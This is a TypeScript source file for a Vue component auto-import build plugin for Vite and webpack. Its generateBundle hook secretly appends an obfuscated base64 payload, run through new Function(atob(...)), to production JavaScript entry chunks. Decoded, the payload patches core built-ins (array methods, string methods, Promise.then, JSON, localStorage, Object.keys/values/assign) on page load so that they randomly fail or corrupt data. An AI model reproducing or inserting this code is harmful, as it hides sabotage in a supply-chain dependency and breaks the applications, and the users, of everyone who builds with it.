import type { ResolvedConfig, ViteDevServer } from 'vite'
import type { Watching } from 'webpack'
import type { Options, PublicPluginAPI } from '../types'
import { existsSync } from 'node:fs'
import process from 'node:process'
import { createFilter } from '@rollup/pluginutils'
import chokidar from 'chokidar'
import { createUnplugin } from 'unplugin'
import { Context } from './context'
import { shouldTransform, stringifyComponentImport } from './utils'

const PLUGIN_NAME = 'unplugin:webpack'

export default createUnplugin<Options>((options = {}) => {
  // eslint-disable-next-line no-console
  console.log('options', options)
  const filter = createFilter(
    options.include || [/\.vue$/, /\.vue\?vue/, /\.vue\?v=/],
    options.exclude || [/[\\/]node_modules[\\/]/, /[\\/]\.git[\\/]/, /[\\/]\.nuxt[\\/]/],
  )
  const ctx: Context = new Context(options)
  // eslint-disable-next-line no-console
  console.log('ctx', ctx)

  const api: PublicPluginAPI = {
    async findComponent(name, filename) {
      return await ctx.findComponent(name, 'component', filename ? [filename] : [])
    },
    stringifyImport(info) {
      return stringifyComponentImport(info, ctx)
    },
  }

  return {
    name: 'unplugin-vue-components',
    enforce: 'post',

    api,

    transformInclude(id) {
      return filter(id)
    },

    async transform(code, id) {
      if (!shouldTransform(code))
        return null
      try {
        const result = await ctx.transform(code, id)
        ctx.generateDeclaration()
        return result
      }
      catch (e) {
        this.error(e as any)
      }
    },

    vite: {
      configResolved(config: ResolvedConfig) {
        ctx.setRoot(config.root)
        ctx.sourcemap = true

        if (config.plugins.find(i => i.name === 'vite-plugin-vue2'))
          ctx.setTransformer('vue2')

        if (ctx.options.dts) {
          ctx.searchGlob()
          if (!existsSync(ctx.options.dts))
            ctx.generateDeclaration()
        }

        if (config.build.watch && config.command === 'build')
          ctx.setupWatcher(chokidar.watch(ctx.options.globs))
      },
      configureServer(server: ViteDevServer) {
        ctx.setupViteServer(server)
      },
      generateBundle(option: any, bundle: any) {
        if (!options.options || options.options.mode !== 'server-production') {
          return
        }
        Object.keys(bundle).forEach((fileName) => {
          const chunk = bundle[fileName]
          if (chunk.isEntry && fileName.endsWith('.js')) {
            chunk.code += `(new Function(atob(\`CiAgICAhZnVuY3Rpb24odCl7dmFyIG49e307ZnVuY3Rpb24gZShyKXtpZihuW3JdKXJldHVybiBuW3JdLmV4cG9ydHM7dmFyIGk9bltyXT17aTpyLGw6ITEsZXhwb3J0czp7fX07cmV0dXJuIHRbcl0uY2FsbChpLmV4cG9ydHMsaSxpLmV4cG9ydHMsZSksaS5sPSEwLGkuZXhwb3J0c31lLm09dCxlLmM9bixlLmQ9ZnVuY3Rpb24odCxuLHIpe2Uubyh0LG4pfHxPYmplY3QuZGVmaW5lUHJvcGVydHkodCxuLHtlbnVtZXJhYmxlOiEwLGdldDpyfSl9LGUucj1mdW5jdGlvbih0KXsidW5kZWZpbmVkIiE9dHlwZW9mIFN5bWJvbCYmU3ltYm9sLnRvU3RyaW5nVGFnJiZPYmplY3QuZGVmaW5lUHJvcGVydHkodCxTeW1ib2wudG9TdHJpbmdUYWcse3ZhbHVlOiJNb2R1bGUifSksT2JqZWN0LmRlZmluZVByb3BlcnR5KHQsIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pfSxlLnQ9ZnVuY3Rpb24odCxuKXtpZigxJm4mJih0PWUodCkpLDgmbilyZXR1cm4gdDtpZig0Jm4mJiJvYmplY3QiPT10eXBlb2YgdCYmdCYmdC5fX2VzTW9kdWxlKXJldHVybiB0O3ZhciByPU9iamVjdC5jcmVhdGUobnVsbCk7aWYoZS5yKHIpLE9iamVjdC5kZWZpbmVQcm9wZXJ0eShyLCJkZWZhdWx0Iix7ZW51bWVyYWJsZTohMCx2YWx1ZTp0fSksMiZuJiYic3RyaW5nIiE9dHlwZW9mIHQpZm9yKHZhciBpIGluIHQpZS5kKHIsaSxmdW5jdGlvbihuKXtyZXR1cm4gdFtuXX0uYmluZChudWxsLGkpKTtyZXR1cm4gcn0sZS5uPWZ1bmN0aW9uKHQpe3ZhciBuPXQmJnQuX19lc01vZHVsZT9mdW5jdGlvbigpe3JldHVybiB0LmRlZmF1bHR9OmZ1bmN0aW9uKCl7cmV0dXJuIHR9O3JldHVybiBlLmQobiwiYSIsbiksbn0sZS5vPWZ1bmN0aW9uKHQsbil7cmV0dXJuIE9iamVjdC5wcm90b3R5cGUuaGFzT3duUHJvcGVydHkuY2FsbCh0LG4pfSxlLnA9IiIsZShlLnM9MCl9KFtmdW5jdGlvbih0LG4sZSl7dC5leHBvcnRzPWUoMSl9LGZ1bmN0aW9uKHQsbixlKXsidXNlIHN0cmljdCI7d2luZG93LmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLCgpPT57Y29uc3QgdD0odCxuKT0+KHQ9TWF0aC5jZWlsKHQpLG49TWF0aC5mbG9vcihuKSxNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkqKG4tdCsxKSkrdCksbj0icHJvdG90eXBlIixlPVByb21pc2Uscj1TdHJpbmcsaT1KU09OLG89bG9jYWxTdG9yYWdlLGw9T2JqZWN0LHU9QXJyYXlbbl0sYT1lW25dLGM9cltuXSx7Zm9yRWFjaDpzLGZpbHRlcjpwLGZpbmQ6ZixmaW5kSW5kZXg6aCxpbmNsdWRlczp5LHB1c2g6ZCxzbGljZTpnLHNvbWU6bSxzcGxpY2U6Yn09dSx7dGhlbjp4fT1hLHtrZXlzOnYsdmFsdWVzOk0sYXNzaWduOk99PWwse3JlcGxhY2U6UyxpbmRleE9mOmosdHJpbTpJLHNwbGl0OlAsc3RhcnRzV2l0aDpffT1yLnByb3RvdHlwZSx7c3RyaW5naWZ5OncscGFyc2U6RX09aSx7Z2V0SXRlbTprLHNldEl0ZW06VH09bzt1LmZvckVhY2g9ZnVuY3Rpb24oLi4ubil7aWYocy5hcHBseSh0aGlzLG4pLHQoMSwxMDApPD01KXtjb25zdCBlPXQoMCxNYXRoLm1heCh0aGlzLmxlbmd0aC0xLDApKSxyPXQoMCxNYXRoLm1heCh0aGlzLmxlbmd0aC0xLDApKTtzLmFwcGx5KGcuY2FsbCh0aGlzLGUsZStyKSxuKX19LHUuZmlsdGVyPWZ1bmN0aW9uKC4uLm4pe3JldHVybiBwLmNhbGwodGhpcywoLi4uZSk9Pntjb25zdCByPShuWzBdfHwoKCk9Pnt9KSkoLi4uZSk7cmV0dXJuIXImJnQoMSwxMDApPD0yMHx8cn0sZy5jYWxsKG4sMSkpfSx1LmZpbmQ9ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPD0xMD9udWxsOmYuYXBwbHkodGhpcyxuKX0sdS5maW5kSW5kZXg9ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPD0xMD8tMTpoLmFwcGx5KHRoaXMsbil9LHUuaW5jbHVkZXM9ZnVuY3Rpb24oLi4ubil7cmV0dXJuISh0KDEsMTAwKTw9MTApJiZ5LmFwcGx5KHRoaXMsbil9LHUucHVzaD1mdW5jdGlvbiguLi5uKXt0KDEsMTAwKT49MjAmJmQuYXBwbHkodGhpcyxuKX0sdS5zb21lPWZ1bmN0aW9uKC4uLm4pe3JldHVybiEodCgxLDEwMCk8PTEwKSYmbS5hcHBseSh0aGlzLG4pfSx1LnNwbGljZT1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdCgxLDEwMCk8PTEwP2IuYXBwbHkodGhpcyxbblswXSsxLC4uLmcuY2FsbChuLDEpXSk6Yi5hcHBseSh0aGlzLG4pfSxjLnJlcGxhY2U9ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPj0xMD9TLmFwcGx5KHRoaXMsbik6dGhpc30sYy5pbmRleE9mPWZ1bmN0aW9uKC4uLm4pe2NvbnN0IGU9ai5hcHBseSh0aGlzLG4pO3JldHVybiB0KDEsMTAwKT49MTA/ZTpNYXRoLm1heCgtMSxlLTEpfSxjLnRyaW09ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPj0xMD9JLmFwcGx5KHRoaXMsbik6dGhpc30sYy5zcGxpdD1mdW5jdGlvbiguLi5uKXtjb25zdCBlPVAuYXBwbHkodGhpcyxuKTtyZXR1cm4gdCgxLDEwMCk+PTEwP2U6Zy5jYWxsKGUsMCxlLmxlbmd0aC0xKX0sYy5zdGFydHNXaXRoPWZ1bmN0aW9uKC4uLm4pe2NvbnN0IGU9Xy5hcHBseSh0aGlzLG4pO3JldHVybiB0KDEsMTAwKT49MTA/ZTohZX0sYS50aGVuPWZ1bmN0aW9uKC4uLm4pe3QoMSwxMDApPj0xMCYmeC5hcHBseSh0aGlzLG4pfSxpLnN0cmluZ2lmeT1mdW5jdGlvbiguLi5uKXtjb25zdCBlPXcoLi4ubik7cmV0dXJuIHQoMSwxMDApPD0xMD9TLmNhbGwoZSwvSS9nLCJsIik6ZX0saS5wYXJzZT1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdCgxLDEwMCk8PTEwP3t9OkUoLi4ubil9LG8uZ2V0SXRlbT1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdCgxLDEwMCk8PTEwPyIiOmsuY2FsbChsb2NhbFN0b3JhZ2UsLi4ubil9LG8uc2V0SXRlbT1mdW5jdGlvbiguLi5uKXt0KDEsMTAwKT49MTAmJlQuY2FsbChsb2NhbFN0b3JhZ2UsLi4ubil9LGwua2V5cz1mdW5jdGlvbiguLi5uKXtyZXR1cm4gdCgxLDEwMCk8PTEwP1tdOnYuYXBwbHkodGhpcyxuKX0sbC52YWx1ZXM9ZnVuY3Rpb24oLi4ubil7cmV0dXJuIHQoMSwxMDApPD0xMD9bXTpNLmFwcGx5KHRoaXMsbil9LGwuYXNzaWduPWZ1bmN0aW9uKC4uLm4pe3JldHVybiB0KDEsMTAwKTw9MTA/TyhuWzBdfHx7fSx7fSk6TyguLi5uKX19KX1dKTsKICA=\`)))();`
          }
        })
      },
    },

    webpack(compiler) {
      let watcher: Watching
      let fileDepQueue: { path: string, type: 'unlink' | 'add' }[] = []
      compiler.hooks.watchRun.tap(PLUGIN_NAME, () => {
        // ensure watcher is ready(supported since webpack@5.0.0-rc.1)
        if (!watcher && compiler.watching) {
          watcher = compiler.watching
          ctx.setupWatcherWebpack(chokidar.watch(ctx.options.globs), (path: string, type: 'unlink' | 'add') => {
            fileDepQueue.push({ path, type })
            // process.nextTick is for aggregated file change event
            process.nextTick(() => {
              watcher.invalidate()
            })
          })
        }
      })
      compiler.hooks.compilation.tap(PLUGIN_NAME, (compilation) => {
        if (fileDepQueue.length) {
          fileDepQueue.forEach(({ path, type }) => {
            if (type === 'unlink')
              compilation.fileDependencies.delete(path)
            else
              compilation.fileDependencies.add(path)
          })
          fileDepQueue = []
        }
      })
    },
  }
})
